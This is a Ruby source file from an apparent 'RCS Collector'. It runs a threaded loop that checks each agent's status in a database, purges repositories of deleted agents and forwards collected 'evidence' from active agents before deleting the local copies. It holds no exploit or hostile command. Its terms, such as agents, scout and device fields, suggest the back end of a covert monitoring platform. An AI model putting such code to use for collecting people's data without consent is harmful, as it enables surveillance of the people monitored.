#
#  Evidence Transfer module for transferring evidence to the db
#

require_relative 'db.rb'
require_relative 'evidence_manager.rb'

# from RCS::Common
require 'rcs-common/trace'
require 'rcs-common/fixnum'
require 'rcs-common/symbolize'

# from system
require 'thread'

module RCS
module Collector

class EvidenceTransfer
  include Singleton
  include RCS::Tracer

  def start
    @threads = Hash.new
    @worker = Thread.new { self.work }
  end

  def work
    # infinite loop for working
    loop do
      # pass the control to other threads
      sleep 1

      # don't try to transfer if the db is down
      next unless DB.instance.connected?

      # for each instance get the ids we have and send them
      EvidenceManager.instance.instances.each do |instance|
        # one thread per instance, but check if an instance is already processing
        @threads[instance] ||= Thread.new do
          begin

            #trace :debug, "Transferring evidence for: #{instance}"

            # get the info from the instance
            info = EvidenceManager.instance.instance_info instance
            if info.nil?
              EvidenceManager.instance.purge(instance, {force: true})
              raise "Invalid repo, deleting"
            end

            # get all the ids of the evidence for this instance
            evidences = EvidenceManager.instance.evidence_ids(instance)

            # only perform the job if we have something to transfer
            unless evidences.empty?

              # make sure that the symbols are present
              # we are doing this hack since we are passing information taken from the store
              # and passing them as they were a session
              sess = info.symbolize
              sess[:demo] = (sess[:demo] == 1) ? true : false
              sess[:scout] = (sess[:scout] == 1) ? true : false

              # ask the database the id of the agent
              status, agent_id = DB.instance.agent_status(sess[:ident], sess[:instance], sess[:platform], sess[:demo], sess[:scout])
              sess[:bid] = agent_id

              case status
                when DB::DELETED_AGENT, DB::NO_SUCH_AGENT, DB::CLOSED_AGENT
                  trace :info, "[#{instance}] has status (#{status}) deleting repository"
                  EvidenceManager.instance.purge(instance, {force: true})
                when DB::QUEUED_AGENT, DB::UNKNOWN_AGENT
                  trace :warn, "[#{instance}] was queued, not transferring evidence"
                when DB::ACTIVE_AGENT
                  raise "agent _id cannot be ZERO" if agent_id == 0
                  # update the status in the db if it was offline when syncing
                  DB.instance.sync_update sess, info['version'], info['user'], info['device'], info['source'], info['sync_time']

                  # transfer all the evidence
                  while (id = evidences.shift)
                    self.transfer instance, id, evidences.count
                  end
              end
            end
          rescue Exception => e
            trace :error, "Error processing evidences: #{e.message}"
            trace :error, e.backtrace
          ensure
            # job done, exit
            @threads.delete(instance)

            #trace :debug, "Job for #{instance} is over (#{@threads.keys.size} working threads)"

            Thread.kill Thread.current
          end
        end
      end
    end
  rescue Exception => e
    trace :error, "Evidence transfer error: #{e.message}"
    retry
  end

  def transfer(instance, id, left)
    evidence = EvidenceManager.instance.get_evidence(id, instance)
    raise "evidence to be transferred is nil" if evidence.nil?

    # send and delete the evidence
    ret, error, action = DB.instance.send_evidence(instance, evidence)

    if ret
      trace :info, "Evidence sent to db [#{instance}] #{evidence.size.to_s_bytes} - #{left} left to send"

      StatsManager.instance.add ev_output: 1, ev_output_size: evidence.size

      EvidenceManager.instance.del_evidence(id, instance) if action == :delete
    else
      trace :error, "Evidence NOT sent to db [#{instance}]: #{error}"
      EvidenceManager.instance.del_evidence(id, instance) if action == :delete
    end
    
  end

end
  
end #Collector::
end #RCS::